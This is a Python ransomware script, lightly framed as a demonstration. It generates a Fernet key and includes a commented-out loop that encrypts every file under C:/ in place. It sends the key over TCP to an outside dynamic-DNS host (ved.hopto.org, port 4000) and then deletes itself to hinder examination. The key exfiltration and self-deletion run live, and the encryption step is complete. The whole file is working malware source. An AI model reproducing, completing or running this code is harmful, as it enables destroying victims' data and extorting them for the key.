
import os
import socket
from cryptography.fernet import Fernet

def main():
    """
    Main function demonstrating:
      1. Generating a Fernet key (AES-based).
      2. (Optionally) Encrypting files in a directory tree.
      3. Sending the key to a remote server via TCP socket.
      4. (Optionally) Removing the script itself.
    """

    # -----------------------------------------------------
    # 1) Generate encryption key and initialize Fernet
    # -----------------------------------------------------
    key = Fernet.generate_key()
    cipher = Fernet(key)

    # -----------------------------------------------------
    # 2) Optional: Encrypt files (DANGEROUS!)
    # -----------------------------------------------------
    # WARNING: The following block enumerates and encrypts all files in "C:/".
    #   This can destroy an entire system if run without caution.
    #   Use only in a safe environment for testing or demonstration.
    #
    # for root_dir, sub_dirs, files in os.walk("C:/"):
    #     for file_name in files:
    #         file_path = os.path.join(root_dir, file_name)
    #         try:
    #             # Read file contents
    #             with open(file_path, "rb") as f:
    #                 original_data = f.read()
    #
    #             # Encrypt file contents
    #             encrypted_data = cipher.encrypt(original_data)
    #
    #             # Write encrypted data back
    #             with open(file_path, "wb") as f:
    #                 f.write(encrypted_data)
    #         except Exception as e:
    #             # If a file can't be read or written, just skip (or handle differently)
    #             print(f"Failed to encrypt {file_path}: {e}")

    # -----------------------------------------------------
    # 3) Socket communication - send key to remote server
    # -----------------------------------------------------
    # Replace with a dummy host if you don't want a real connection
    host_name = 'ved.hopto.org' #Dynamic DNS 
    host_port = 4000

    try:
        # Resolve hostname to IP
        host_ip = socket.gethostbyname(host_name)
    except socket.gaierror as e:
        print(f"Failed to resolve hostname '{host_name}': {e}")
        return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Attempt to connect to the server
        s.connect((host_ip, host_port))
        # Send the key
        s.sendall(key)
        print(f"Key successfully sent to {host_name}:{host_port}")
    except Exception as e:
        print(f"Failed to connect or send key: {e}")
    finally:
        # Always close the socket
        s.close()

    # -----------------------------------------------------
    # 4) Optional: Remove this script from filesystem
    # -----------------------------------------------------
    # This is dangerous for debugging and demonstration:
    #   - Disables post-run examination of the code
    #   - Could raise suspicion or cause system errors if
    #     the script is missing mid-process
    #
    # Use with caution or comment out for public repository.
    #
    script_path = os.path.realpath(__file__)
    os.remove(script_path)

if __name__ == "__main__":
    main()
